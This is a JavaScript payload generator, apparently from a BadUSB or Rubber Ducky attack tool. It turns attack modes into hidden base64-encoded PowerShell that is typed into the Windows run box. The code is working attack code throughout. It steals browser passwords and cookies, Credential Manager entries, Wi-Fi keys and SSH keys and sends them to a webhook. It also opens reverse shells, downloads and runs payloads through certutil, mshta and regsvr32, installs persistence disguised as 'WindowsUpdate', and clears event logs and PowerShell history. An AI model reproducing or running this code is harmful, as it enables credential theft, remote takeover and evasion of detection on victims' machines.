// ─────────────────────────────────────────────────────────────────────────────
// Payload generation (PowerShell / DuckyScript) based on mode and config
// ─────────────────────────────────────────────────────────────────────────────

// PowerShell -EncodedCommand expects UTF-16LE base64, not UTF-8
function ps64(script) {
  const bytes = []
  for (let i = 0; i < script.length; i++) {
    const c = script.charCodeAt(i)
    bytes.push(c & 0xFF)         // low byte
    bytes.push((c >>> 8) & 0xFF) // high byte (UTF-16LE)
  }
  let bin = ''
  for (const b of bytes) bin += String.fromCharCode(b)
  return btoa(bin)
}

const runHidden = (script) =>
  `powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ${ps64(script)}`

// ── A-06 : Chrome Password Exfil ─────────────────────────────────────────────
// Universal PS 5.1+ approach: exports the master key (DPAPI) + the encrypted DB
// to the webhook. AES-GCM decryption on the attacker side (Python/launcher).
function chromePsScript(cfg) {
  const dest = cfg.webhookUrl
    ? `Invoke-RestMethod -Uri '${cfg.webhookUrl}' -Method Post -ContentType 'application/json' -Body $body -EA 0`
    : `Set-Clipboard $body`

  return `
$ErrorActionPreference='SilentlyContinue'
Add-Type -AssemblyName System.Security
$ls=[IO.File]::ReadAllText("$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Local State")|ConvertFrom-Json
$ek=[Convert]::FromBase64String($ls.os_crypt.encrypted_key)
$ek=$ek[5..($ek.Length-1)]
$mk=[Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect($ek,$null,'CurrentUser'))
$src="$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
$tmp="$env:TEMP\\cld$(Get-Random)"
[IO.File]::Copy($src,$tmp,$true)
$db=[Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp))
[IO.File]::Delete($tmp)
$body=ConvertTo-Json @{t='chrome';mk=$mk;db=$db;pc=$env:COMPUTERNAME;u=$env:USERNAME} -Compress
${dest}
`.trim()
}

// ── A-07 : Firefox Password Exfil ────────────────────────────────────────────
function firefoxPsScript(cfg) {
  const webhookLine = cfg.webhookUrl
    ? `Invoke-RestMethod -Uri '${cfg.webhookUrl}' -Method Post -ContentType 'application/json' -Body (ConvertTo-Json @{content=($out -join "\`n")})`
    : `Set-Clipboard ($out -join "\`n")`

  return `
$ErrorActionPreference='SilentlyContinue'
$profile=(Get-ChildItem "$env:APPDATA\\Mozilla\\Firefox\\Profiles" -Dir|Sort LastWriteTime -Desc|Select -First 1).FullName
$logins=$profile+"\\logins.json"
if(Test-Path $logins){
  $j=Get-Content $logins|ConvertFrom-Json
  $out=$j.logins|ForEach-Object{"$($_.hostname) | $($_.encryptedUsername) | $($_.encryptedPassword)"}
  ${webhookLine}
}
`.trim()
}

// ── A-08 : Windows Credential Manager ────────────────────────────────────────
function credManagerPsScript(cfg) {
  const webhookLine = cfg.webhookUrl
    ? `Invoke-RestMethod -Uri '${cfg.webhookUrl}' -Method Post -ContentType 'application/json' -Body (ConvertTo-Json @{content=($out -join "\`n")})`
    : `Set-Clipboard ($out -join "\`n")`

  return `
$ErrorActionPreference='SilentlyContinue'
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault=New-Object Windows.Security.Credentials.PasswordVault
$out=$vault.RetrieveAll()|ForEach-Object{$_.RetrievePassword();"$($_.Resource) | $($_.UserName) | $($_.Password)"}
${webhookLine}
`.trim()
}

// ── A-09 : Wi-Fi Password Dumper ──────────────────────────────────────────────
// Forces netsh output to English via chcp 437, independent of the locale
function wifiPsScript(cfg) {
  const dest = cfg.exfilMode === 'Presse-papier'
    ? `Set-Clipboard ($out -join "\`n")`
    : `Invoke-RestMethod -Uri '${cfg.webhookUrl}' -Method Post -ContentType 'application/json' -Body (ConvertTo-Json @{content=($out -join "\`n")}) -EA 0`

  return `
$ErrorActionPreference='SilentlyContinue'
$null=cmd /c "chcp 437" 2>$null
$out=(netsh wlan show profiles)|Select-String "All User Profile"|ForEach-Object{
  $n=$_.ToString().Trim().Split(":")[-1].Trim()
  $raw=netsh wlan show profile name="$n" key=clear
  $k=($raw|Select-String "Key Content")
  $pw=if($k){$k.ToString().Trim().Split(":")[-1].Trim()}else{"[protected/empty]"}
  "$n | $pw"
}
${dest}
`.trim()
}

// ── A-12 : Environment Enumerator ────────────────────────────────────────────
function enumPsScript(cfg) {
  const dest = cfg.webhookUrl
    ? `Invoke-RestMethod -Uri '${cfg.webhookUrl}' -Method Post -ContentType 'application/json' -Body (ConvertTo-Json @{content=$out})`
    : `Set-Clipboard $out`

  return `
$ErrorActionPreference='SilentlyContinue'
$out=@"
=== WHOAMI ===
$(whoami /all 2>&1)
=== NETWORK ===
$(ipconfig /all 2>&1)
=== ARP ===
$(arp -a 2>&1)
=== NETSTAT ===
$(netstat -ano 2>&1)
=== PROCESSES ===
$(tasklist /fo csv 2>&1 | Select-Object -First 40)
=== ENV ===
$(Get-ChildItem Env: | Select-Object Name,Value | Format-Table -AutoSize | Out-String)
"@
${dest}
`.trim()
}

// ── A-02 : Reverse Shell Dropper ─────────────────────────────────────────────
function reverseShellPs(cfg) {
  const { lhost, lport } = cfg
  if (cfg.os?.startsWith('Linux') || cfg.os?.startsWith('macOS')) {
    return `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`
  }
  return `
$client=New-Object Net.Sockets.TCPClient('${lhost}',${lport})
$stream=$client.GetStream()
[byte[]]$bytes=0..65535|%{0}
while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){
  $data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
  $send=(iex $data 2>&1|Out-String)
  $sbytes=([Text.Encoding]::ASCII).GetBytes($send)
  $stream.Write($sbytes,0,$sbytes.Length)
  $stream.Flush()
}
`.trim()
}

// ── A-04 : Multi-Stage Dropper ────────────────────────────────────────────────
function multiStagePs(cfg) {
  const exec   = cfg.exec    ? `Start-Process '${cfg.outPath}'` : ''
  const clean  = cfg.cleanup ? `Start-Sleep 2; Remove-Item '${cfg.outPath}' -Force` : ''
  return `
$ErrorActionPreference='SilentlyContinue'
(New-Object Net.WebClient).DownloadFile('${cfg.url}','${cfg.outPath}')
${exec}
${clean}
`.trim()
}

// ── A-13 : Startup Persistence ───────────────────────────────────────────────
function persistencePs(cfg) {
  if (cfg.method === 'Registry HKCU\\Run') {
    return `Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value '${cfg.command}'`
  }
  if (cfg.method === 'Scheduled Task') {
    return `Register-ScheduledTask -TaskName '${cfg.taskName}' -Action (New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -c "${cfg.command}"') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -RunLevel Highest -Force`
  }
  const startup = `$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`
  return `$s=New-Object -COM WScript.Shell; $l=$s.CreateShortcut('${startup}\\${cfg.taskName || 'helper'}.lnk'); $l.TargetPath='powershell'; $l.Arguments='-w h -c "${cfg.command}"'; $l.Save()`
}

// ── A-15 : Anti-Forensics ─────────────────────────────────────────────────────
function antiForensicsPs(cfg) {
  const lines = []
  if (cfg.clearLogs)
    lines.push(`'Application','Security','System','Windows PowerShell'|%{wevtutil cl $_}`)
  if (cfg.clearPS)
    lines.push(`Remove-Item "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" -Force -EA 0`)
  if (cfg.clearPrefetch)
    lines.push(`Remove-Item 'C:\\Windows\\Prefetch\\*' -Force -EA 0`)
  return lines.join('\n')
}

// ── A-05 : LOLBins ────────────────────────────────────────────────────────────
function lolbinsCmd(cfg) {
  const p = cfg.payload
  switch (cfg.lolbin) {
    case 'certutil (base64)':
      return `certutil -urlcache -split -f "${p}" C:\\Users\\Public\\tmp.b64 && certutil -decode C:\\Users\\Public\\tmp.b64 C:\\Users\\Public\\tmp.exe && C:\\Users\\Public\\tmp.exe`
    case 'mshta (vbs)':
      return `mshta ${p}`
    case 'regsvr32 (COM)':
      return `regsvr32 /s /n /u /i:${p} scrobj.dll`
    case 'wscript (js)':
      return `wscript //E:jscript C:\\Users\\Public\\p.js`
    case 'rundll32':
      return `rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";eval("w=new%20ActiveXObject(\\"WScript.Shell\\");w.run(\\"${p}\\");window.close()")}`
    default:
      return `mshta ${p}`
  }
}

// ── DuckyScript wrapper → injection via WIN+R ─────────────────────────────────
export function buildDuckyFromPs(psScript, speed = 60) {
  const encoded = ps64(psScript)
  return `DELAY 1000
GUI r
DELAY 600
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ${encoded}
ENTER`
}

// ── Entry point: generates the final DuckyScript for a mode + config ────────
export function generatePayload(modeId, config) {
  let psScript = null
  let ducky    = config.script || ''

  switch (modeId) {
    case 'A-01': return { ducky: config.script || '', psScript: null }
    case 'A-02':
      psScript = reverseShellPs(config)
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    case 'A-03': return { ducky: config.script || '', psScript: null }
    case 'A-04':
      psScript = multiStagePs(config)
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    case 'A-05':
      ducky = `DELAY 1000\nGUI r\nDELAY 600\nSTRING cmd /c ${lolbinsCmd(config)}\nENTER`
      return { ducky, psScript: null }
    case 'A-06':
      psScript = chromePsScript(config)
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    case 'A-07':
      psScript = firefoxPsScript(config)
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    case 'A-08':
      psScript = credManagerPsScript(config)
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    case 'A-09':
      psScript = wifiPsScript(config)
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    case 'A-10':
      psScript = `$ErrorActionPreference='SilentlyContinue'\n$k=Get-ChildItem "$env:USERPROFILE\\.ssh" -File -EA 0 | ForEach-Object{$_.Name+"|"+[IO.File]::ReadAllText($_.FullName)}\nInvoke-RestMethod -Uri '${config.webhookUrl}' -Method Post -ContentType 'application/json' -Body (ConvertTo-Json @{content=($k -join "\n---\n")})`
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    case 'A-11': {
      const cookiePaths = {
        'Chrome':  `"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies"`,
        'Edge':    `"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cookies"`,
        'Firefox': `(Get-ChildItem "$env:APPDATA\\Mozilla\\Firefox\\Profiles" -Filter "cookies.sqlite" -Recurse -EA 0 | Select-Object -First 1 -ExpandProperty FullName)`,
      }
      const targets = config.browsers === 'Tous'
        ? Object.entries(cookiePaths)
        : [[config.browsers || 'Chrome', cookiePaths[config.browsers || 'Chrome']]]
      const copyLines = targets.map(([name, p]) =>
        `$t${name}="$env:TEMP\\${name.toLowerCase()}ck$(Get-Random)";try{[IO.File]::Copy(${p},$t${name},$true)}catch{}`
      ).join('\n')
      const reportLines = targets.map(([name]) =>
        `"${name}: $t${name}"`
      ).join('+"`n"+')
      const dest = config.webhookUrl
        ? `Invoke-RestMethod -Uri '${config.webhookUrl}' -Method Post -ContentType 'application/json' -Body (ConvertTo-Json @{content=(${reportLines})}) -EA 0`
        : `Set-Clipboard (${reportLines})`
      psScript = `$ErrorActionPreference='SilentlyContinue'\n${copyLines}\n${dest}`
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    }
    case 'A-12':
      psScript = enumPsScript(config)
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    case 'A-13':
      psScript = persistencePs(config)
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    case 'A-14':
      ducky = `DELAY 1000\nGUI r\nDELAY 600\nSTRING ${config.browser === 'Default' ? 'start' : config.browser.toLowerCase()} ${config.kiosk ? '--kiosk ' : ''}${config.url}\nENTER`
      return { ducky, psScript: null }
    case 'A-15':
      psScript = antiForensicsPs(config)
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    case 'A-16': return { ducky: '', psScript: null }
    case 'A-17':
      ducky = (config.sequence || '')
        .replace('$USERNAME', config.username || '')
        .replace('$PASSWORD', config.password || '')
      return { ducky, psScript: null }
    case 'A-18':
      psScript = `Set-Clipboard '${config.replaceWith}'`
      return { ducky: buildDuckyFromPs(psScript, 50), psScript }

    // ── B-01 : USB Ninja Drop ───────────────────────────────────────────────
    case 'B-01': {
      if (config.autorun === false) return { ducky: '', psScript: null }
      const fname   = config.payloadFile || 'update.exe'
      const volName = (config.driveName  || 'LEXAR').split(' ')[0]
      psScript = `$ErrorActionPreference='SilentlyContinue'
$d=(Get-WmiObject Win32_LogicalDisk|Where{$_.VolumeName-like '*${volName}*'}|Select -First 1).DeviceID
if(!$d){$d=(Get-WmiObject Win32_LogicalDisk|Where{$_.DriveType-eq 2}|Select -First 1).DeviceID}
if($d){Start-Process "$d\\${fname}"}`
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    }

    // ── B-02 : Chrome Exfil → Flash ─────────────────────────────────────────
    case 'B-02': {
      const volName = (config.driveName || 'KINGSTON').split(' ')[0]
      const outFile = config.filename   || 'report.txt'
      psScript = `$ErrorActionPreference='SilentlyContinue'
Add-Type -AssemblyName System.Security
$ls=[IO.File]::ReadAllText("$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Local State")|ConvertFrom-Json
$ek=[Convert]::FromBase64String($ls.os_crypt.encrypted_key)
$ek=$ek[5..($ek.Length-1)]
$mk=[Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect($ek,$null,'CurrentUser'))
$src="$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
$tmp="$env:TEMP\\cld$(Get-Random)"
[IO.File]::Copy($src,$tmp,$true)
$db=[Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp))
[IO.File]::Delete($tmp)
$d=(Get-WmiObject Win32_LogicalDisk|Where{$_.VolumeName-like '*${volName}*'}|Select -First 1).DeviceID
if(!$d){$d=(Get-WmiObject Win32_LogicalDisk|Where{$_.DriveType-eq 2}|Select -First 1).DeviceID}
if($d){$r=ConvertTo-Json @{t='chrome';mk=$mk;db=$db;pc=$env:COMPUTERNAME;u=$env:USERNAME} -Compress;[IO.File]::WriteAllText("$d\\${outFile}",$r)}`
      return { ducky: buildDuckyFromPs(psScript, config.speed), psScript }
    }

    // ── D-03 : Exfil Data Receiver ──────────────────────────────────────────
    case 'D-03':
      return { ducky: config.payload || '', psScript: null }

    default:
      return { ducky: '', psScript: null }
  }
}
